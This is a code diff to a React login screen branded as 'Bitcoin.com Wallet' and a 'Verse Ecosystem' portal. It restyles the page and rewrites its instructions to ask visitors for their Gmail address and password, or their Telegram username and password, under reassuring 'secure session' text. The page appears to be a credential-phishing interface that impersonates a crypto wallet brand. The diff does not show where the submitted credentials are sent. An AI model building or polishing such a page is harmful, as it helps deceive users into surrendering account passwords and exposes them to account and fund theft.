@@ -659,12 +659,8 @@ export default function App() {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-[9999] bg-gradient-to-br from-[#02081f] via-[#051130] to-[#091b4f] flex items-center justify-center p-6 pt-[55px] overflow-y-auto"
+            className="fixed inset-0 z-[9999] bg-white flex flex-col items-center justify-start sm:justify-center p-6 py-12 overflow-y-auto"
           >
-            {/* Ambient luxury colored bg glowing backdrops */}
-            <div className="absolute top-1/4 left-1/4 w-[350px] h-[350px] bg-blue-500/10 rounded-full blur-[110px] pointer-events-none animate-pulse" />
-            <div className="absolute bottom-1/4 right-1/4 w-[350px] h-[350px] bg-indigo-500/10 rounded-full blur-[110px] pointer-events-none animate-pulse" style={{ animationDuration: '6s' }} />
-
             <AnimatePresence mode="wait">
               {isConnectingApp ? (
                 <motion.div
@@ -672,28 +668,54 @@ export default function App() {
                   initial={{ opacity: 0, scale: 0.95 }}
                   animate={{ opacity: 1, scale: 1 }}
                   exit={{ opacity: 0, scale: 1.05 }}
-                  className="text-center space-y-6 relative z-10 max-w-sm"
+                  className="text-center space-y-6 relative z-10 max-w-sm flex flex-col items-center"
                 >
-                  <div className="relative w-24 h-24 mx-auto mb-4">
-                    {/* Pulsing glow rings */}
-                    <div className="absolute inset-[-12px] bg-blue-500/10 rounded-full blur-md animate-pulse"></div>
-                    <div className="absolute inset-0 border-4 border-white/5 rounded-full"></div>
-                    <div className="absolute inset-0 border-4 border-t-blue-400 border-r-indigo-500 border-l-sky-500 rounded-full animate-spin" style={{ animationDuration: '0.8s' }}></div>
+                  {/* BRAND LOGOS AT LOADING SCREEN TOO */}
+                  <div className="flex justify-center items-center gap-4 mb-2">
+                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_8px_30px_rgb(0,0,0,0.08)] border border-slate-200/80 p-1 bg-white transition-all hover:scale-105 duration-300">
+                      <img
+                        src="https://i.ibb.co.com/bRMwqvJz/IMG-20260530-154814.jpg"
+                        alt="Bitcoin.com Wallet Logo"
+                        className="w-full h-full object-cover rounded-[1.1rem]"
+                        referrerPolicy="no-referrer"
+                      />
+                    </div>
+                    <div className="w-16 h-16 rounded-[1.4rem] overflow-hidden shadow-[0_8px_30px_rgb(0,0,0,0.08)] border border-slate-200/80 p-1 bg-white transition-all hover:scale-105 duration-300">
+                      <img
+                        src="https://i.ibb.co.com/gbFvzHdb/file-00000000fdd071fa8b2edad69edccb1f.png"
+                        alt="Verse Ecosystem Logo"
+                        className="w-full h-full object-cover rounded-[1.1rem]"
+                        referrerPolicy="no-referrer"
+                      />
+                    </div>
                   </div>
-                  <h2 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-sky-200 to-indigo-300 uppercase tracking-widest animate-pulse">
+
+                  <div className="text-center">
+                    <h1 className="text-2xl font-extrabold text-slate-900 tracking-tight">
+                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-indigo-600">Wallet</span>
+                    </h1>
+                    <p className="text-[9px] font-mono tracking-[0.25em] text-[#c0a080] font-black uppercase mt-0.5">AND VERSE ECOSYSTEM & ANALYTICS PORTAL</p>
+                  </div>
+
+                  <div className="relative w-20 h-20 mx-auto mt-2">
+                    <div className="absolute inset-[-10px] bg-blue-500/5 rounded-full blur-sm animate-pulse"></div>
+                    <div className="absolute inset-0 border-4 border-slate-150 rounded-full"></div>
+                    <div className="absolute inset-0 border-4 border-t-blue-500 border-r-indigo-500 border-l-sky-500 rounded-full animate-spin" style={{ animationDuration: '0.8s' }}></div>
+                  </div>
+                  <h2 className="text-xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-600 via-indigo-600 to-sky-600 uppercase tracking-widest animate-pulse">
                     Connecting Portal...
                   </h2>
-                  <p className="text-xs text-slate-400 font-bold font-mono tracking-wider">Please wait while your secure session is starting</p>
+                  <p className="text-xs text-slate-500 font-bold font-mono tracking-wider">Please wait while your secure session is starting</p>
                   
                   {/* Dynamic Progress indicator */}
                   <div className="w-[240px] mx-auto space-y-2 pt-2">
-                    <div className="h-2 bg-white/5 rounded-full overflow-hidden">
+                    <div className="h-2 bg-slate-100 rounded-full overflow-hidden">
                       <div 
-                        className="h-full bg-gradient-to-r from-blue-600 via-indigo-650 to-sky-400 transition-all duration-150 ease-out"
+                        className="h-full bg-gradient-to-r from-blue-600 to-indigo-600 transition-all duration-150 ease-out"
                         style={{ width: `${connectProgress}%` }}
                       />
                     </div>
-                    <div className="flex justify-between items-center text-[10px] text-gray-400 font-mono font-bold">
+                    <div className="flex justify-between items-center text-[10px] text-slate-500 font-mono font-bold">
                       <span>SECURE SYNCING</span>
                       <span>{Math.floor(connectProgress)}%</span>
                     </div>
@@ -709,7 +731,7 @@ export default function App() {
                     className="text-center w-full px-4"
                   >
                     <div className="flex justify-center items-center gap-4 mb-4">
-                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-2xl border-2 border-blue-500/30 p-1 bg-slate-950/80 transition-all hover:scale-110 duration-300">
+                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(0,0,0,0.07)] border border-slate-200/80 p-1 bg-white transition-all hover:scale-110 duration-300">
                         <img
                           src="https://i.ibb.co.com/bRMwqvJz/IMG-20260530-154814.jpg"
                           alt="Bitcoin.com Wallet Logo"
@@ -717,7 +739,7 @@ export default function App() {
                           referrerPolicy="no-referrer"
                         />
                       </div>
-                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-2xl border-2 border-blue-500/30 p-1 bg-slate-950/80 transition-all hover:scale-110 duration-300">
+                      <div className="w-20 h-20 rounded-[1.8rem] overflow-hidden shadow-[0_12px_36px_rgba(0,0,0,0.07)] border border-slate-200/80 p-1 bg-white transition-all hover:scale-110 duration-300">
                         <img
                           src="https://i.ibb.co.com/gbFvzHdb/file-00000000fdd071fa8b2edad69edccb1f.png"
                           alt="Verse Ecosystem Logo"
@@ -726,20 +748,23 @@ export default function App() {
                         />
                       </div>
                     </div>
-                    <h1 className="text-3xl font-extrabold text-white tracking-tight">
-                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-sky-300">Wallet</span>
+                    <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">
+                      Bitcoin.com <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-indigo-600">Wallet</span>
                     </h1>
                     <p className="text-[11px] font-mono tracking-[0.2em] text-[#c0a080] font-black uppercase mt-1">AND VERSE ECOSYSTEM & ANALYTICS PORTAL</p>
                   </motion.div>
 
                   {/* SIGN IN INSTRUCTIONS DESCRIPTION CARD */}
-                  <div className="bg-blue-950/50 border border-blue-500/20 rounded-[2rem] p-5 backdrop-blur-md text-left text-slate-200 text-xs leading-relaxed space-y-3 w-full">
-                    <div className="flex items-center gap-2 text-sky-400 font-extrabold uppercase tracking-wider text-[11px]">
-                      <Info className="w-4 h-4" />
+                  <div className="bg-blue-50/70 border border-blue-100 rounded-[2rem] p-5 text-left text-slate-700 text-xs leading-relaxed space-y-3 w-full shadow-sm">
+                    <div className="flex items-center gap-2 text-blue-600 font-extrabold uppercase tracking-wider text-[11px]">
+                      <Info className="w-4 h-4 text-blue-500" />
                       <span>Security Instructions</span>
                     </div>
-                    <p className="text-slate-350 font-medium font-sans">
-                      Welcome to the portal. Enter your security credentials below to enter. This login page acts as your portal gateway to access website features and analytics.
+                    <p className="text-slate-650 font-medium font-sans">
+                      Welcome. To access the website, please use your Gmail account and create a password for security purposes. Alternatively, you can log in using your Telegram username and a secure password. Thank you.
+                    </p>
+                    <p className="text-slate-500 font-normal font-sans text-[11px] mt-1.5 pt-1.5 border-t border-slate-150/80 leading-relaxed">
+                      For your convenience, you may click on the 'Autofill Demo Account' option. It will automatically take you to the demo account, allowing you to easily access the website.
                     </p>
                   </div>
 
@@ -747,10 +772,10 @@ export default function App() {
                   <motion.div 
                     initial={{ opacity: 0, y: 20 }}
                     animate={{ opacity: 1, y: 0 }}
-                    className="w-full bg-[#0b1329]/90 border border-blue-900/55 rounded-[2.2rem] p-6 backdrop-blur-2xl transition-all shadow-2xl flex flex-col gap-5 border-t-2 border-t-blue-500/20"
+                    className="w-full bg-white border border-slate-200 rounded-[2.2rem] p-6 shadow-xl flex flex-col gap-5 border-t-2 border-t-blue-500/20"
                   >
                     <div>
-                      <span className="text-[9px] font-mono tracking-widest text-sky-400 font-black uppercase bg-blue-500/10 px-2.5 py-1 rounded-full border border-blue-500/10">
+                      <span className="text-[9px] font-mono tracking-widest text-blue-600 font-black uppercase bg-blue-50 px-2.5 py-1 rounded-full border border-blue-100">
                         {loginMethod === 'google' ? 'GOOGLE EMAIL SESSION' : 'TELEGRAM SECURE CORES'}
                       </span>
                     </div>
@@ -759,24 +784,24 @@ export default function App() {
                       {loginMethod === 'google' ? (
                         <>
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-400 font-extrabold mb-1.5 px-0.5">Google Gmail Account</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-600 font-extrabold mb-1.5 px-0.5">Google Gmail Account</label>
                             <input
                               type="email"
                               value={customGoogleEmailApp}
                               onChange={(e) => setCustomGoogleEmailApp(e.target.value)}
                               placeholder="...........@gmail.com"
-                              className="w-full bg-[#050b1a] border border-blue-900/50 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl px-4 py-3 text-xs text-white font-semibold transition-all font-sans"
+                              className="w-full bg-slate-50 border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all font-sans"
                             />
                           </div>
 
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-400 font-extrabold mb-1.5 px-0.5">Access Password</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-600 font-extrabold mb-1.5 px-0.5">Access Password</label>
                             <input
                               type="password"
                               value={telegramPass}
                               onChange={(e) => setTelegramPass(e.target.value)}
                               placeholder="••••••••"
-                              className="w-full bg-[#050b1a] border border-blue-900/50 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 outline-none rounded-xl px-4 py-3 text-xs text-white font-semibold transition-all"
+                              className="w-full bg-slate-50 border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                             />
                           </div>
 
@@ -787,7 +812,7 @@ export default function App() {
                                 setCustomGoogleEmailApp('...........@gmail.com');
                                 setTelegramPass('supersecret');
                               }}
-                              className="inline-flex items-center gap-1.5 text-[10.5px] text-blue-400 hover:text-blue-300 transition-colors font-mono font-black hover:underline bg-blue-950/20 hover:bg-blue-950/40 px-3 py-1.5 rounded-xl border border-blue-500/15 cursor-pointer"
+                              className="inline-flex items-center gap-1.5 text-[10.5px] text-blue-600 hover:text-blue-700 transition-colors font-mono font-black hover:underline bg-blue-50 hover:bg-blue-100 px-3 py-1.5 rounded-xl border border-blue-100 cursor-pointer"
                             >
                               💡 Autofill Demo Account
                             </button>
@@ -796,27 +821,27 @@ export default function App() {
                       ) : (
                         <>
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-sky-400 font-extrabold mb-1.5 px-0.5">Telegram Username</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-600 font-extrabold mb-1.5 px-0.5">Telegram Username</label>
                             <div className="relative">
-                              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-sky-400 font-black font-mono text-xs">@</span>
+                              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-black font-mono text-xs">@</span>
                               <input
                                 type="text"
                                 value={telegramUser}
                                 onChange={(e) => setTelegramUser(e.target.value)}
                                 placeholder="username"
-                                className="w-full bg-[#050b1a] border border-sky-900/50 focus:border-sky-450 focus:ring-1 focus:ring-sky-450 outline-none rounded-xl pl-8 pr-4 py-3 text-xs text-white font-semibold transition-all"
+                                className="w-full bg-slate-50 border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none rounded-xl pl-8 pr-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                               />
                             </div>
                           </div>
 
                           <div>
-                            <label className="block text-[10px] uppercase font-mono tracking-wider text-sky-400 font-extrabold mb-1.5 px-0.5">Access Password</label>
+                            <label className="block text-[10px] uppercase font-mono tracking-wider text-slate-600 font-extrabold mb-1.5 px-0.5">Access Password</label>
                             <input
                               type="password"
                               value={telegramPass}
                               onChange={(e) => setTelegramPass(e.target.value)}
                               placeholder="••••••••"
-                              className="w-full bg-[#050b1a] border border-sky-900/50 focus:border-sky-450 focus:ring-1 focus:ring-sky-450 outline-none rounded-xl px-4 py-3 text-xs text-white font-semibold transition-all"
+                              className="w-full bg-slate-50 border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none rounded-xl px-4 py-3 text-xs text-slate-800 font-semibold transition-all"
                             />
                           </div>
 
@@ -827,7 +852,7 @@ export default function App() {
                                 setTelegramUser('juwel_rana_official');
                                 setTelegramPass('secretpass123');
                               }}
-                              className="inline-flex items-center gap-1.5 text-[10.5px] text-sky-400 hover:text-sky-300 transition-colors font-mono font-black hover:underline bg-sky-950/20 hover:bg-sky-950/40 px-3 py-1.5 rounded-xl border border-sky-500/15 cursor-pointer"
+                              className="inline-flex items-center gap-1.5 text-[10.5px] text-blue-600 hover:text-blue-700 transition-colors font-mono font-black hover:underline bg-blue-50 hover:bg-blue-100 px-3 py-1.5 rounded-xl border border-blue-100 cursor-pointer"
                             >
                               💡 Autofill Demo Account
                             </button>
@@ -836,16 +861,15 @@ export default function App() {
                       )}
 
                       {/* Unified Trigger Button below Autofill to hop styles */}
-                      <div className="pt-3 border-t border-blue-900/20 mt-1">
+                      <div className="pt-3 border-t border-slate-100 mt-1">
                         <button
                           type="button"
                           onClick={() => {
                             setLoginMethod(loginMethod === 'google' ? 'telegram' : 'google');
                           }}
-                          className="w-full text-center py-2.5 rounded-xl text-[11px] font-black uppercase tracking-wider transition-all bg-sky-500/10 hover:bg-sky-500/20 text-sky-450 border border-sky-550/25 flex items-center justify-center gap-2 cursor-pointer shadow-sm font-sans"
+                          className="w-full text-center py-2.5 rounded-xl text-xs font-semibold uppercase tracking-wider transition-all bg-white hover:bg-slate-50 border border-slate-300 text-slate-700 flex items-center justify-center gap-2 cursor-pointer shadow-sm font-sans"
                         >
-                          <Send className="w-3.5 h-3.5 rotate-45 text-sky-400" />
-                          Login to Telegram Username
+                          {loginMethod === 'google' ? 'Login To Telegram' : 'Login To Gmail'}
                         </button>
                       </div>
                     </div>
@@ -916,7 +940,7 @@ export default function App() {
                         </>
                       ) : (
                         <>
-                          <Send className="w-3.5 h-3.5 rotate-45" />
+                          <Lock className="w-3.5 h-3.5" />
                           Sign In with Telegram Account
                         </>
                       )}
